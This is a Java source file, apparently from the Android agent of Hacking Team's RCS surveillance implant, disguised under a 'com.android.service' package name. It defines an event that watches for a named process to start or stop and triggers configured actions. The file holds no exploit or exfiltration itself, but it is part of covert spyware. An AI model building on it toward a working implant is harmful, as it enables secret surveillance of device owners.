/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventProcess.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.event;

import java.io.IOException;

import com.android.service.ProcessInfo;
import com.android.service.ProcessStatus;
import com.android.service.auto.Cfg;
import com.android.service.interfaces.Observer;
import com.android.service.listener.ListenerProcess;
import com.android.service.util.Check;
import com.android.service.util.DataBuffer;
import com.android.service.util.WChar;

public class EventProcess extends EventBase implements Observer<ProcessInfo> {
	/** The Constant TAG. */
	private static final String TAG = "EventProcess";

	private int actionOnEnter, actionOnExit;
	private int type;
	private boolean active = false;
	private String name;

	@Override
	public void begin() {
		ListenerProcess.self().attach(this);
	}

	@Override
	public void end() {
		ListenerProcess.self().detach(this);
	}

	@Override
	public boolean parse(EventConf event) {
		super.setEvent(event);

		final byte[] conf = event.getParams();
		final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length);

		try {
			actionOnEnter = event.getAction();
			actionOnExit = databuffer.readInt();
			type = databuffer.readInt();

			// Estraiamo il nome del processo
			byte[] procName = new byte[databuffer.readInt()];
			databuffer.read(procName);

			name = WChar.getString(procName, true);
		} catch (final IOException e) {
			if(Cfg.DEBUG) Check.log( TAG + " Error: params FAILED");

			return false;
		}

		return true;
	}

	@Override
	public void go() {

	}

	// Viene richiamata dal listener (dalla dispatch())
	public int notification(ProcessInfo process) {
		String processName = process.processInfo.processName;
		if (!processName.equals(name)) {
			return 0;
		}
		switch (type) {
			case 0: // Process
				if (process.status == ProcessStatus.START && active == false) {
					active = true;
					onEnter();
				} else if (process.status == ProcessStatus.STOP && active == true) {
					active = false;
					onExit();
				}

				break;

			case 1: // Window
			default:
				break;
		}

		return 0;
	}

	public void onEnter() {
		if(Cfg.DEBUG) Check.log( TAG + " (onEnter): triggering " + actionOnEnter + " " + name);
		trigger(actionOnEnter);
	}

	public void onExit() {
		if(Cfg.DEBUG) Check.log( TAG + " (onExit): triggering " + actionOnExit + " " + name);
		trigger(actionOnExit);
	}
}
